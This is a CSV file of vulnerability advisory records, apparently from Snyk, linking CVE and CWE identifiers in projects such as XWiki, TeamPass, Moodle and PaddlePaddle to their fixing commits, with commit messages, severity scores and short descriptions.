CVE-2023-37277,CWE-352,Snyk,https://security.snyk.io/vuln/SNYK-JAVA-ORGXWIKIPLATFORM-5769704,11/07/2023,11/07/2023,https://github.com/xwiki/xwiki-platform/commit/4c175405faa0e62437df397811c7526dfc0fbae7,Cross-site Request Forgery (CSRF),https://api.github.com/repos/xwiki/xwiki-platform/commits/4c175405faa0e62437df397811c7526dfc0fbae7,Michael Hamann,michael.hamann@xwiki.com,xwiki-platform,4c175405faa0e62437df397811c7526dfc0fbae7,"XWIKI-20135: Require a CSRF token for some request types in the REST API

* Require a CSRF token in the XWiki-Form-Token header in content types
  allowed in simple requests.
* Add integration tests to check that the check is indeed working.
* Automatically add the CSRF token header in same-origin requests
  initiated from JavaScript.
* Add an integration test to check that the form token is correctly
  added and fetch requests are still working.

Co-authored-by: Marius Dumitru Florea <marius@xwiki.com>",Java,9.6,critical,"Affected versions of this package are vulnerable to Cross-site Request Forgery (CSRF). The REST API allows executing all actions via POST requests and accepts text/plain, multipart/form-data or application/www-form-urlencoded as content types which can be sent via regular HTML forms. With the interaction of a user with programming rights, this allows remote code execution through script macros and thus impacts the integrity, availability and confidentiality of the whole XWiki installation.
Note:
For regular cookie-based authentication, the vulnerability is mitigated by SameSite cookie restrictions but as of March 2023, these are not enabled by default in Firefox and Safari.",2023
CVE-2023-37905,CWE-79,Snyk,https://security.snyk.io/vuln/SNYK-JS-CKEDITORWORDCOUNTPLUGIN-5769703,11/07/2023,11/07/2023,https://github.com/w8tcha/CKEditor-WordCount-Plugin/commit/0f03b3e5b7c1409998a13aba3a95396e6fa349d8,Cross-site Scripting (XSS),https://api.github.com/repos/w8tcha/CKEditor-WordCount-Plugin/commits/0f03b3e5b7c1409998a13aba3a95396e6fa349d8,Ingo,thewatcher@watchersnet.de,CKEditor-WordCount-Plugin,0f03b3e5b7c1409998a13aba3a95396e6fa349d8,[FIXED] xss issue,JavaScript,6.1,medium,"ckeditor-wordcount-plugin is a WordCount Plugin for CKEditor Editor
Affected versions of this package are vulnerable to Cross-site Scripting (XSS) due to improper user-input sanitization when switching to Source Mode.",2023
CVE-2023-37905,CWE-79,Snyk,https://security.snyk.io/vuln/SNYK-PHP-CKEDITORWORDCOUNTPLUGIN-5769702,11/07/2023,11/07/2023,https://github.com/w8tcha/CKEditor-WordCount-Plugin/commit/0f03b3e5b7c1409998a13aba3a95396e6fa349d8,Cross-site Scripting (XSS),https://api.github.com/repos/w8tcha/CKEditor-WordCount-Plugin/commits/0f03b3e5b7c1409998a13aba3a95396e6fa349d8,Ingo,thewatcher@watchersnet.de,CKEditor-WordCount-Plugin,0f03b3e5b7c1409998a13aba3a95396e6fa349d8,[FIXED] xss issue,JavaScript,6.1,medium,Affected versions of this package are vulnerable to Cross-site Scripting (XSS) due to improper user-input sanitization when switching to Source Mode.,2023
CVE-2023-3574,CWE-863,Snyk,https://security.snyk.io/vuln/SNYK-PHP-PIMCORECUSTOMERMANAGEMENTFRAMEWORKBUNDLE-5769700,11/07/2023,11/07/2023,https://github.com/pimcore/customer-data-framework/commit/f15668c86db254e86ba7ac895bc3cdd1a2a3cc45,Incorrect Authorization,https://api.github.com/repos/pimcore/customer-data-framework/commits/f15668c86db254e86ba7ac895bc3cdd1a2a3cc45,JiaJia Ji,kingjia90@gmail.com,customer-data-framework,f15668c86db254e86ba7ac895bc3cdd1a2a3cc45,"[Bug]: Add missing permission check on Rules controller (#483)

* chore: fix rules permission check

* Apply php-cs-fixer changes

* chore: fix wrong class

* Update RulesController.php

* fix stan

---------

Co-authored-by: kingjia90 <kingjia90@users.noreply.github.com>",PHP,6.3,medium,"pimcore/customer-management-framework-bundle is a Customer Management Framework for management of customer data within Pimcore.
Affected versions of this package are vulnerable to Incorrect Authorization in the Rules Controller. The product performs authorization checks incorrectly when an unauthorized actor tries to access a resource or perform an action. The attacker can view and freely perform actions to add, modify, or delete rules.",2023
CVE-2023-3565,CWE-79,Snyk,https://security.snyk.io/vuln/SNYK-PHP-NILSTEAMPASSNETTEAMPASS-5769701,11/07/2023,11/07/2023,https://github.com/nilsteampassnet/teampass/commit/820bb49a362a566c9038e4a3048b26d654babb0e,Cross-site Scripting (XSS),https://api.github.com/repos/nilsteampassnet/teampass/commits/820bb49a362a566c9038e4a3048b26d654babb0e,nilsteampassnet,nils@teampass.net,teampass,820bb49a362a566c9038e4a3048b26d654babb0e,"3.0.10

Fix possible xss",PHP,5.2,medium,"nilsteampassnet/teampass is a password manager.
Affected versions of this package are vulnerable to Cross-site Scripting (XSS) due to improper user-input sanitization in the Default session expiration time parameter.",2023
CVE-2023-37271,CWE-94,Snyk,https://security.snyk.io/vuln/SNYK-PYTHON-RESTRICTEDPYTHON-5769699,11/07/2023,11/07/2023,https://github.com/zopefoundation/RestrictedPython/commit/d8c5aa72c5d0ec8eceab635d93d6bc8321116002,Arbitrary Code Execution,https://api.github.com/repos/zopefoundation/RestrictedPython/commits/d8c5aa72c5d0ec8eceab635d93d6bc8321116002,Jens Vagelpohl,jens@plyp.com,RestrictedPython,d8c5aa72c5d0ec8eceab635d93d6bc8321116002,"Merge pull request from GHSA-wqc8-x2pr-7jqh

* move the commented fix into this branch

* more verbose infos, and linting

* 3 tests for generators

* - add change log entry

---------

Co-authored-by: Jens Vagelpohl <jens@plyp.com>",Unknown,7.3,high,"RestrictedPython is a RestrictedPython is a defined subset of the Python language which allows to provide a program input into a trusted environment.
Affected versions of this package are vulnerable to Arbitrary Code Execution via stack frame sandbox escape due to not checking access to stack frames and their attributes. Stack frames are accessible within at least generators and generator expressions, which are allowed inside RestrictedPython. An attacker with access to a RestrictedPython environment can write code that gets the current stack frame in a generator and then walk the stack all the way beyond the RestrictedPython invocation boundary, thus breaking out of the restricted scope and allowing the call of unrestricted Python code, therefore potentially allowing arbitrary code execution in the Python interpreter.
Note:
All RestrictedPython deployments that allow untrusted users to write Python code in the RestrictedPython environment are at risk. In terms of Zope and Plone, this would mean deployments where the administrator allows untrusted users to create and/or edit objects of type Script (Python), DTML Method, DTML Document or Zope Page Template. This is a non-default configuration and likely to be extremely rare.",2023
CVE-2023-35887,CWE-200,Snyk,https://security.snyk.io/vuln/SNYK-JAVA-ORGAPACHESSHD-5769687,11/07/2023,11/07/2023,https://github.com/apache/mina-sshd/commit/a61e93035f06bff8fc622ad94870fb773d48b9f0,Information Exposure,https://api.github.com/repos/apache/mina-sshd/commits/a61e93035f06bff8fc622ad94870fb773d48b9f0,Guillaume Nodet,gnodet@gmail.com,mina-sshd,a61e93035f06bff8fc622ad94870fb773d48b9f0,[SSHD-1234] Rooted file system can leak informations,Java,5.0,medium,"Affected versions of this package are vulnerable to Information Exposure. In SFTP servers implemented using Apache MINA SSHD that use a RootedFileSystem, logged users may be able to discover ""exists/does not exist"" information about items outside the rooted tree via paths including parent navigation (..) beyond the root, or involving symlinks.",2023
,CWE-79,Snyk,https://security.snyk.io/vuln/SNYK-PYTHON-WHATSAPPCHATEXPORTER-5769697,11/07/2023,11/07/2023,https://github.com/KnugiHK/WhatsApp-Chat-Exporter/commit/bfdc68cd6ad53ceecf132773f9aaba50dd80fe79,Cross-site Scripting (XSS),https://api.github.com/repos/KnugiHK/WhatsApp-Chat-Exporter/commits/bfdc68cd6ad53ceecf132773f9aaba50dd80fe79,KnugiHK,24708955+KnugiHK@users.noreply.github.com,WhatsApp-Chat-Exporter,bfdc68cd6ad53ceecf132773f9aaba50dd80fe79,Add autoescape to rendering,Python,5.4,medium,"whatsapp-chat-exporter is an A Whatsapp database parser that will give you the history of your Whatsapp conversations in HTML and JSON. Android, iOS, iPadOS, Crypt12, Crypt14, Crypt15 supported.
Affected versions of this package are vulnerable to Cross-site Scripting (XSS) due to improper user-input sanitization in the HTML output of chats. XSS is intended to be mitigated by Jinja's escape function. However, autoescape=True was missing when setting the environment. Although the actual impact is low, considering the HTML file is being viewed offline, an adversary may still be able to inject malicious payloads into the chat through WhatsApp. 
Note: All users are affected.",2023
CVE-2023-35887,CWE-200,Snyk,https://security.snyk.io/vuln/SNYK-JAVA-ORGAPACHESSHD-5769686,11/07/2023,11/07/2023,https://github.com/apache/mina-sshd/commit/a61e93035f06bff8fc622ad94870fb773d48b9f0,Information Exposure,https://api.github.com/repos/apache/mina-sshd/commits/a61e93035f06bff8fc622ad94870fb773d48b9f0,Guillaume Nodet,gnodet@gmail.com,mina-sshd,a61e93035f06bff8fc622ad94870fb773d48b9f0,[SSHD-1234] Rooted file system can leak informations,Java,5.0,medium,"Affected versions of this package are vulnerable to Information Exposure. In SFTP servers implemented using Apache MINA SSHD that use a RootedFileSystem, logged users may be able to discover ""exists/does not exist"" information about items outside the rooted tree via paths including parent navigation (..) beyond the root, or involving symlinks.",2023
,CWE-611,Snyk,https://security.snyk.io/vuln/SNYK-JAVA-ORGECLIPSEJETTY-5769685,11/07/2023,11/07/2023,https://github.com/eclipse/jetty.project/commit/9a05c75ad28ebad4abbe624fa432664c59763747,XML External Entity (XXE) Injection,https://api.github.com/repos/eclipse/jetty.project/commits/9a05c75ad28ebad4abbe624fa432664c59763747,Joakim Erdfelt,joakim.erdfelt@gmail.com,jetty.project,9a05c75ad28ebad4abbe624fa432664c59763747,"Issue #10066 - Allow customization of `SAXParserFactory` and `SAXParser` in `XmlParser` (#10067)

* Allow customization of SAXParserFactory / SAXParser in XmlParser
* Introduce method `.getSAXParser()`
---------

Signed-off-by: Joakim Erdfelt <joakim.erdfelt@gmail.com>
Co-authored-by: Greg Wilkins <gregw@webtide.com>",Java,3.9,low,"Affected versions of this package are vulnerable to XML External Entity (XXE) Injection via the XmlParser when parsing Jetty’s XML configuration files by importing a (remote) malicious WAR into Jetty’s server. Exploiting this vulnerability is possible when the WAR includes a malicious web.xml.
Note:
There are no circumstances in a normally deployed Jetty server where potentially hostile XML is given to the XmlParser class without the attacker already having arbitrary access to the server. I.e., in order to exploit XmlParser, the attacker would already have the ability to deploy and execute hostile code. Specifically, Jetty has no protection against a malicious web application, and potentially hostile web applications should only be run on isolated virtualization.
Thus this is not considered a vulnerability of the Jetty server itself, as any such usage of the Jetty XmlParser is equally vulnerable as direct usage of the JVM-supplied SAX parser. No CVE will be allocated to this advisory.
However, any direct usage of the XmlParser class by an application may be vulnerable. The impact would greatly depend on how the application uses XmlParser, but it could be a denial of service due to large entity expansion or possibly the revealing of local files if the XML results are accessible remotely.",2023
CVE-2023-34442,CWE-200,Snyk,https://security.snyk.io/vuln/SNYK-JAVA-ORGAPACHECAMEL-5769688,11/07/2023,11/07/2023,https://github.com/apache/camel/commit/b61d5b6be4f98b673dc977ad1bc6f004642644ab,Information Exposure,https://api.github.com/repos/apache/camel/commits/b61d5b6be4f98b673dc977ad1bc6f004642644ab,Andrea Cosentino,ancosen@gmail.com,camel,b61d5b6be4f98b673dc977ad1bc6f004642644ab,"CAMEL-19421 - Camel-Jira: Use Files.createTempFile in FileConverter instead of creating File directly

Signed-off-by: Andrea Cosentino <ancosen@gmail.com>",Java,5.3,medium,Affected versions of this package are vulnerable to Information Exposure to an unauthorized actor due to improper handling of file paths in the FileConverter.java file which might allow an attacker to manipulate the filename to traverse directories.,2023
CVE-2021-3396,CWE-863,Snyk,https://security.snyk.io/vuln/SNYK-JAVA-ORGOPENNMS-5769689,11/07/2023,24/05/2022,https://github.com/OpenNMS/opennms/commit/56d49389080427049b65fa8c76860218f96c6ba4,Incorrect Authorization,https://api.github.com/repos/OpenNMS/opennms/commits/56d49389080427049b65fa8c76860218f96c6ba4,Christian Pape,Christian.Pape@informatik.hs-fulda.de,opennms,56d49389080427049b65fa8c76860218f96c6ba4,NMS-13103: Sandboxing Jexl2 expression engine,Java,8.8,high,"Affected versions of this package are vulnerable to Incorrect Authorization that allows local and remote code execution as an authenticated user via a custom, targeted JEXL expression.",2023
CVE-2021-33796,CWE-416,Snyk,https://security.snyk.io/vuln/SNYK-UNMANAGED-MUJS-5768555,09/07/2023,09/07/2023,https://github.com/ccxvii/mujs/commit/7ef066a3bb95bf83e7c5be50d859e62e58fe8515,Denial of Service (DoS),https://api.github.com/repos/ccxvii/mujs/commits/7ef066a3bb95bf83e7c5be50d859e62e58fe8515,Tor Andersson,tor.andersson@artifex.com,mujs,7ef066a3bb95bf83e7c5be50d859e62e58fe8515,"Fix use-after-free in regexp source property access.

The underlying string of the ""source"" property of a regular expression
object can be freed if the regexp is garbage collected.

This could lead to a use-after-free, because the accessor incorrectly
assumed that the regexp source was an interned (thus never freed) string.
Fix this by calling js_pushstring instead of the faster but unsafe
js_pushliteral.

Many thanks to Connor Nelson for spotting this!",C/C++,7.5,high,Affected versions of this package are vulnerable to Denial of Service (DoS). A use-after-free flaw in the regexp source property access may cause denial of service.,2023
CVE-2021-32494,CWE-369,Snyk,https://security.snyk.io/vuln/SNYK-UNMANAGED-RADAREORGRADARE2-5768551,09/07/2023,09/07/2023,https://github.com/radareorg/radare2/commit/a07dedb804a82bc01c07072861942dd80c6b6d62,Denial of Service (DoS),https://api.github.com/repos/radareorg/radare2/commits/a07dedb804a82bc01c07072861942dd80c6b6d62,pancake,pancake@nopcode.org,radare2,a07dedb804a82bc01c07072861942dd80c6b6d62,Fix #18667 - division by zero in the macho parser ##bin,C/C++,7.5,high,Affected versions of this package are vulnerable to Denial of Service (DoS). Radare2 has a division by zero vulnerability in Mach-O parser's rebase_buffer function. This allow attackers to create malicious inputs that can cause denial of service.,2023
CVE-2021-32495,CWE-416,Snyk,https://security.snyk.io/vuln/SNYK-UNMANAGED-RADAREORGRADARE2-5768553,09/07/2023,09/07/2023,https://github.com/radareorg/radare2/commit/5e16e2d1c9fe245e4c17005d779fde91ec0b9c05,Denial of Service (DoS),https://api.github.com/repos/radareorg/radare2/commits/5e16e2d1c9fe245e4c17005d779fde91ec0b9c05,pancake,pancake@nopcode.org,radare2,5e16e2d1c9fe245e4c17005d779fde91ec0b9c05,Fix #18666 - uaf in python bin parser,C/C++,7.5,high,Affected versions of this package are vulnerable to Denial of Service (DoS). Radare2 has a use-after-free vulnerability in pyc parser's get_none_object function. Attacker can read freed memory afterwards. This will allow attackers to cause denial of service.,2023
CVE-2023-3553,CWE-200,Snyk,https://security.snyk.io/vuln/SNYK-PHP-NILSTEAMPASSNETTEAMPASS-5768550,09/07/2023,09/07/2023,https://github.com/nilsteampassnet/teampass/commit/e9f90b746fdde135da3c7fbe4fa22fe2bd32e66b,Information Exposure,https://api.github.com/repos/nilsteampassnet/teampass/commits/e9f90b746fdde135da3c7fbe4fa22fe2bd32e66b,nilsteampassnet,nils@teampass.net,teampass,e9f90b746fdde135da3c7fbe4fa22fe2bd32e66b,"3.0.10

Fix directory listing",HTML,5.3,medium,"nilsteampassnet/teampass is a password manager.
Affected versions of this package are vulnerable to Information Exposure. Teampass has directory listing by default for various endpoints that eventually discloses application-specific and user data and files.",2023
CVE-2023-3552,CWE-116,Snyk,https://security.snyk.io/vuln/SNYK-PHP-NILSTEAMPASSNETTEAMPASS-5768549,09/07/2023,09/07/2023,https://github.com/nilsteampassnet/teampass/commit/8acb4dacc2d008a4186a4e13cc143e978f113955,Improper Input Validation,https://api.github.com/repos/nilsteampassnet/teampass/commits/8acb4dacc2d008a4186a4e13cc143e978f113955,nilsteampassnet,nils@teampass.net,teampass,8acb4dacc2d008a4186a4e13cc143e978f113955,"3.0.10

Fix possible xss in folder page",JavaScript,7.6,high,"nilsteampassnet/teampass is a password manager.
Affected versions of this package are vulnerable to Improper Input Validation. The teampass_session session cookie can be exfiltrated by an authenticated user and used to make requests as an admin. The successful exploitation of this vulnerability can lead to the execution of arbitrary HTML and script code in a user's browser session in the context of the affected website. As a result, an attacker can steal session cookies, which could lead to unauthorized actions executed with the privileges of the victim user.",2023
CVE-2023-3551,CWE-94,Snyk,https://security.snyk.io/vuln/SNYK-PHP-NILSTEAMPASSNETTEAMPASS-5768547,09/07/2023,09/07/2023,https://github.com/nilsteampassnet/teampass/commit/cc6abc76aa46ed4a27736c1d2f21e432a5d54e6f,Remote Code Execution (RCE),https://api.github.com/repos/nilsteampassnet/teampass/commits/cc6abc76aa46ed4a27736c1d2f21e432a5d54e6f,nilsteampassnet,nils@teampass.net,teampass,cc6abc76aa46ed4a27736c1d2f21e432a5d54e6f,"3.0.10

Fix for #3779, #3775
Fix for improper handling of input in admin setting pages",JavaScript,7.2,high,"nilsteampassnet/teampass is a password manager.
Affected versions of this package are vulnerable to Remote Code Execution (RCE). An authenticated Admin can set values of certain input fields which are directly inserted into a tp.config.php file, which could allow an attacker to inject malicious PHP code to perform a remote code execution attack.",2023
CVE-2017-15063,CWE-352,Snyk,https://security.snyk.io/vuln/SNYK-PHP-INTELLIANTSSUBRION-5808000,27/07/2023,14/05/2022,https://github.com/intelliants/subrion/commit/5fdf03af1a7d89c3692faa155e17457153020dca,Cross-site Request Forgery (CSRF),https://api.github.com/repos/intelliants/subrion/commits/5fdf03af1a7d89c3692faa155e17457153020dca,Janur Jangaraev,jjangaraev@intelliants.com,subrion,5fdf03af1a7d89c3692faa155e17457153020dca,#547,PHP,8.8,high,"intelliants/subrion is an open source php content management system.
Affected versions of this package are vulnerable to Cross-site Request Forgery (CSRF) due to a logic error. Although there is functionality to detect CSRF, it is called too late in the ia.core.php code, allowing an attack against the query parameter to the panel/database.",2023
CVE-2017-17971,CWE-79,Snyk,https://security.snyk.io/vuln/SNYK-PHP-DOLIBARRDOLIBARR-5807996,27/07/2023,14/05/2022,https://github.com/Dolibarr/dolibarr/commit/b2feac9d90f2ecfd5916c4d49176ff1a138744c8,Cross-site Scripting (XSS),https://api.github.com/repos/Dolibarr/dolibarr/commits/b2feac9d90f2ecfd5916c4d49176ff1a138744c8,Laurent Destailleur,eldy@destailleur.fr,dolibarr,b2feac9d90f2ecfd5916c4d49176ff1a138744c8,CVE-2017-17971,PHP,6.1,medium,"dolibarr/dolibarr is a modern and easy to use web software to manage your business.
Affected versions of this package are vulnerable to Cross-site Scripting (XSS). Dolibarr ERP and CRM contain XSS Vulnerability.
via the test_sql_and_script_inject function in htdocs/main.inc.php which blocks some event attributes but neither onclick nor onscroll, which allows exploiting this vulnerability.",2023
CVE-2017-14240,CWE-200,Snyk,https://security.snyk.io/vuln/SNYK-PHP-DOLIBARRDOLIBARR-5807994,27/07/2023,17/05/2022,https://github.com/Dolibarr/dolibarr/commit/d26b2a694de30f95e46ea54ea72cc54f0d38e548,Information Exposure,https://api.github.com/repos/Dolibarr/dolibarr/commits/d26b2a694de30f95e46ea54ea72cc54f0d38e548,Laurent Destailleur,eldy@destailleur.fr,dolibarr,d26b2a694de30f95e46ea54ea72cc54f0d38e548,"FIX Security fixes (filter onload js, less verbose error message in
download and viewimage, show info to encourage dolibarr_main_prod=1)",PHP,7.5,high,"dolibarr/dolibarr is a modern and easy to use web software to manage your business.
Affected versions of this package are vulnerable to Information Exposure in document.php via the file parameter.",2023
CVE-2017-14498,CWE-79,Snyk,https://security.snyk.io/vuln/SNYK-PHP-SILVERSTRIPECMS-5807995,27/07/2023,17/05/2022,https://github.com/silverstripe/silverstripe-framework/commit/25b77a2ff8deabe8e8894002b9a5647eaec27b0a,Cross-site Scripting (XSS),https://api.github.com/repos/silverstripe/silverstripe-framework/commits/25b77a2ff8deabe8e8894002b9a5647eaec27b0a,Daniel Hensby,dhensby@silverstripe.com,silverstripe-framework,25b77a2ff8deabe8e8894002b9a5647eaec27b0a,[SS-2017-017] FIX SVG uploads disabled by default,PHP,6.1,medium,"Affected versions of this package are vulnerable to Cross-site Scripting (XSS) via an SVG document that is mishandled by the Insert Media instance in the content editor or via the path admin/assets/add.
Exploiting this vulnerability is possible due to the lack of input validation and output sanitization, allowing an attacker can upload SVG files containing malicious JavaScript code to be executed under a victim's browser context.",2023
CVE-2017-14241,CWE-79,Snyk,https://security.snyk.io/vuln/SNYK-PHP-DOLIBARRDOLIBARR-5807993,27/07/2023,17/05/2022,https://github.com/Dolibarr/dolibarr/commit/d26b2a694de30f95e46ea54ea72cc54f0d38e548,Cross-site Scripting (XSS),https://api.github.com/repos/Dolibarr/dolibarr/commits/d26b2a694de30f95e46ea54ea72cc54f0d38e548,Laurent Destailleur,eldy@destailleur.fr,dolibarr,d26b2a694de30f95e46ea54ea72cc54f0d38e548,"FIX Security fixes (filter onload js, less verbose error message in
download and viewimage, show info to encourage dolibarr_main_prod=1)",PHP,5.4,medium,"dolibarr/dolibarr is a modern and easy to use web software to manage your business.
Affected versions of this package are vulnerable to Cross-site Scripting (XSS) which allows remote authenticated users to inject arbitrary web script or HTML via the Title parameter to htdocs/admin/menus/edit.php.",2023
CVE-2017-12157,CWE-200,Snyk,https://security.snyk.io/vuln/SNYK-PHP-MOODLEMOODLE-5807992,27/07/2023,17/05/2022,https://github.com/moodle/moodle/commit/85b531e8beae3497ec2075e07e59c581fccb317c,Information Exposure,https://api.github.com/repos/moodle/moodle/commits/85b531e8beae3497ec2075e07e59c581fccb317c,Juan Leyva,juanleyvadelgado@gmail.com,moodle,85b531e8beae3497ec2075e07e59c581fccb317c,"MDL-58762 report: Check group permissions in course user reports

Teachers were able to see any student report even with forced separated
groups and capability moodle/course:accessallgroups off.",PHP,4.3,medium,"moodle/moodle is a learning platform.
Affected versions of this package are vulnerable to Information Exposure when various course reports allow teachers to view details about users in the groups they can't access.",2023
CVE-2017-12156,CWE-79,Snyk,https://security.snyk.io/vuln/SNYK-PHP-MOODLEMOODLE-5807991,27/07/2023,17/05/2022,https://github.com/moodle/moodle/commit/a39d2976fe5e91da7a28a8512d5b94d4a27067b8,Cross-site Scripting (XSS),https://api.github.com/repos/moodle/moodle/commits/a39d2976fe5e91da7a28a8512d5b94d4a27067b8,Marina Glancy,marina@moodle.com,moodle,a39d2976fe5e91da7a28a8512d5b94d4a27067b8,MDL-59972 mod_feedback: escape subject when showing the contact form,PHP,6.1,medium,"moodle/moodle is a learning platform.
Affected versions of this package are vulnerable to Cross-site Scripting (XSS) in the contact form on the ""non-respondents"" page in non-anonymous feedback.",2023
CVE-2017-15280,CWE-611,Snyk,https://security.snyk.io/vuln/SNYK-DOTNET-UMBRACOCMSCORE-5807990,27/07/2023,17/05/2022,https://github.com/umbraco/Umbraco-CMS/commit/5dde2efe0d2b3a47d17439e03acabb7ea2befb64,XML External Entity (XXE) Injection,https://api.github.com/repos/umbraco/Umbraco-CMS/commits/5dde2efe0d2b3a47d17439e03acabb7ea2befb64,Sebastiaan Janssen,sebastiaan@umbraco.com,Umbraco-CMS,5dde2efe0d2b3a47d17439e03acabb7ea2befb64,U4-10506 Importing a specially crafted document type file can cause XXE attack,C#,5.5,medium,"UmbracoCms.Core is an ASP.NET CMS.
Affected versions of this package are vulnerable to XML External Entity (XXE) Injection via importDocumenttype.aspx.cs. Exploiting this vulnerability allows the attacker to obtain sensitive information by reading files on the server or sending TCP requests to intranet hosts.",2023
CVE-2017-15279,CWE-79,Snyk,https://security.snyk.io/vuln/SNYK-DOTNET-UMBRACOCMSCORE-5807989,27/07/2023,17/05/2022,https://github.com/umbraco/Umbraco-CMS/commit/fe2b86b681455ac975b294652064b2718d4e2ba2,Cross-site Scripting (XSS),https://api.github.com/repos/umbraco/Umbraco-CMS/commits/fe2b86b681455ac975b294652064b2718d4e2ba2,Sebastiaan Janssen,sebastiaan@umbraco.com,Umbraco-CMS,fe2b86b681455ac975b294652064b2718d4e2ba2,Html encode nodenames to prevent XSS attacks. Fixes U4-10497 XSS Vulnerability in page name.,C#,5.4,medium,"UmbracoCms.Core is an ASP.NET CMS.
Affected versions of this package are vulnerable to Cross-site Scripting (XSS) due to improper user input sanitization. Exploiting this vulnerability is possible via the PageName (aka nodename) parameter during the creation of a new page.",2023
CVE-2023-39151,CWE-79,Snyk,https://security.snyk.io/vuln/SNYK-JAVA-ORGJENKINSCIMAIN-5807988,27/07/2023,26/07/2023,https://github.com/jenkinsci/jenkins/commit/1b9f1ccdbb7d00705b036d1332908fe52c2cd7ae,Cross-site Scripting (XSS),https://api.github.com/repos/jenkinsci/jenkins/commits/1b9f1ccdbb7d00705b036d1332908fe52c2cd7ae,Yaroslav Afenkin,yaroslavafenkin@users.noreply.github.com,jenkins,1b9f1ccdbb7d00705b036d1332908fe52c2cd7ae,[SECURITY-3188],Java,7.6,high,"org.jenkins-ci.main:jenkins-core is an open source automation server.
Affected versions of this package are vulnerable to Cross-site Scripting (XSS) due to improper sanitization and encoding of plain URLs when transforming them into hyperlinks in build logs.
Note:
This vulnerability is exploitable by attackers able to control build log contents.",2023
CVE-2023-38671,CWE-122,Snyk,https://security.snyk.io/vuln/SNYK-PYTHON-PADDLEPADDLE-5807395,27/07/2023,27/07/2023,https://github.com/PaddlePaddle/Paddle/commit/5feadc0b2753db513ca1523affadc93b086318d8,Heap-based Buffer Overflow,https://api.github.com/repos/PaddlePaddle/Paddle/commits/5feadc0b2753db513ca1523affadc93b086318d8,XiangGao,jeff41404@gmail.com,Paddle,5feadc0b2753db513ca1523affadc93b086318d8,fix trace heap overflow (#49548),C/C++,8.3,high,"paddlepaddle is a Parallel Distributed Deep Learning
Affected versions of this package are vulnerable to Heap-based Buffer Overflow in paddle.trace, which can lead to denial of service, information disclosure, or other impacts.",2023
CVE-2023-38670,CWE-476,Snyk,https://security.snyk.io/vuln/SNYK-PYTHON-PADDLEPADDLE-5807396,27/07/2023,27/07/2023,https://github.com/PaddlePaddle/Paddle/commit/d994d212260373426a26577fd233f6e9b1d76306,NULL Pointer Dereference,https://api.github.com/repos/PaddlePaddle/Paddle/commits/d994d212260373426a26577fd233f6e9b1d76306,RedContritio,RedContritio@qq.com,Paddle,d994d212260373426a26577fd233f6e9b1d76306,"Fix 空指针 (Null pointer) of case 17 paddle.flip (#50028)

* check tensor numel in PyObject_CheckLongOrToLong

* add unittest",C/C++,7.5,high,"paddlepaddle is a Parallel Distributed Deep Learning
Affected versions of this package are vulnerable to NULL Pointer Dereference in the PyObject_CheckLongOrToLong() function used by paddle.flip, which can cause a segmentation fault and crash.",2023
CVE-2023-38669,CWE-416,Snyk,https://security.snyk.io/vuln/SNYK-PYTHON-PADDLEPADDLE-5807397,27/07/2023,27/07/2023,https://github.com/PaddlePaddle/Paddle/commit/5fca45ea35009bd7e9ca8d0fae3cd1c5fa891dd6,Use After Free,https://api.github.com/repos/PaddlePaddle/Paddle/commits/5fca45ea35009bd7e9ca8d0fae3cd1c5fa891dd6,wawltor,fangzeyang0904@hotmail.com,Paddle,5fca45ea35009bd7e9ca8d0fae3cd1c5fa891dd6,"[0 Tensor support] support the 0d tensor for the cumsum (#49518)

* Add the cumsum 0d tensor

* xpu and cpu judge the 0d  tensor

* change to 2022 to 2023 in new commit

* fix the reverse logic",C/C++,8.3,high,"paddlepaddle is a Parallel Distributed Deep Learning
Affected versions of this package are vulnerable to Use After Free in paddle.diagonal.",2023
CVE-2023-38673,CWE-78,Snyk,https://security.snyk.io/vuln/SNYK-PYTHON-PADDLEPADDLE-5807393,26/07/2023,26/07/2023,https://github.com/PaddlePaddle/Paddle/commit/41226d55ad8495b61656068e50b42859f056df9c,Command Injection,https://api.github.com/repos/PaddlePaddle/Paddle/commits/41226d55ad8495b61656068e50b42859f056df9c,Roc,30228238+sljlp@users.noreply.github.com,Paddle,41226d55ad8495b61656068e50b42859f056df9c,"fix mkdir (#52570)

* fix mkdir

* update",Python,9.8,critical,"paddlepaddle is a Parallel Distributed Deep Learning
Affected versions of this package are vulnerable to Command Injection in fs.py via the os.system method.",2023
,CWE-798,Snyk,https://security.snyk.io/vuln/SNYK-JAVA-ORGFOLIO-5806573,26/07/2023,25/07/2023,https://github.com/folio-org/mod-data-export-spring/commit/93aff4566bff59e30f4121b5a2bda5b0b508a446,Use of Hard-coded Credentials,https://api.github.com/repos/folio-org/mod-data-export-spring/commits/93aff4566bff59e30f4121b5a2bda5b0b508a446,julianladisch,julianladisch@users.noreply.github.com,mod-data-export-spring,93aff4566bff59e30f4121b5a2bda5b0b508a446,"Merge pull request from GHSA-vf78-3q9f-92g3

MODEXPS-226 - Invalid system user credentials usage",Markdown,9.1,critical,"Affected versions of this package are vulnerable to Use of Hard-coded Credentials. The module creates a system user that is used to perform internal module-to-module operations. Credentials for this user are hard-coded in the source code. This makes it trivial to authenticate as this user, resulting in unauthorized access to potentially dangerous APIs, allowing to view and modify configuration including single-sign-on configuration, to read, add and modify user data, and to read and transfer fees/fines in a patron's account.",2023
CVE-2023-38672,CWE-400,Snyk,https://security.snyk.io/vuln/SNYK-PYTHON-PADDLEPADDLE-5807394,27/07/2023,27/07/2023,https://github.com/PaddlePaddle/Paddle/commit/fb74147c6aa3ae8a1256f8e84f46af3632190f44,Denial of Service (DoS),https://api.github.com/repos/PaddlePaddle/Paddle/commits/fb74147c6aa3ae8a1256f8e84f46af3632190f44,张春乔,83450930+Liyulingyue@users.noreply.github.com,Paddle,fb74147c6aa3ae8a1256f8e84f46af3632190f44,"Fix the div 0 error of matrix_power (#49942)

* add zero size check in matrix_power_kernel_impl.h

* add zero size check in matrix_power_kernel_impl.h

* add zero size check in unittest

* bug_fix

* bug_fix

* bug_fix

* bug_fix

* bug_fix

* bug fix

* bug_fix

* bug_fix

* add static check

* delete the dy codes",C/C++,6.5,medium,"paddlepaddle is a Parallel Distributed Deep Learning
Affected versions of this package are vulnerable to Denial of Service (DoS) due to a divide-by-zero exception in paddle.linalg.matrix_power, which can trigger a crash.",2023
